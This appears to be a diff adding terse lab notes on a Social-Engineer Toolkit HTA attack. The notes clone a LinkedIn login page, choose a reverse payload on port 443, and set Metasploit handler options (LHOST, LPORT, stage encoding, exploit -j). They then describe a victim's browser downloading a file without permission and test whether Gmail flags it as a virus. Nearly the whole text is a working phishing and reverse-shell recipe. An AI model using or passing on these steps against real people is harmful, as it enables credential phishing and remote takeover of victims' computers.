@@ -1,0 +1,16 @@
+- setoolkit
+-HTA ATTCK
+- https://linkedin.com/login
+- reverse payload 443
+- payload number 3
+
+set LHOST ipaddress
+set LPORT  1235 or 4444
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j 
+
+Open Firefox and enter the ip address. We will see that a file was downloaded without any permission
+Try sharing this file through your gmail. A caution message of Virus detected will be shown while 
+sharing the file.
+
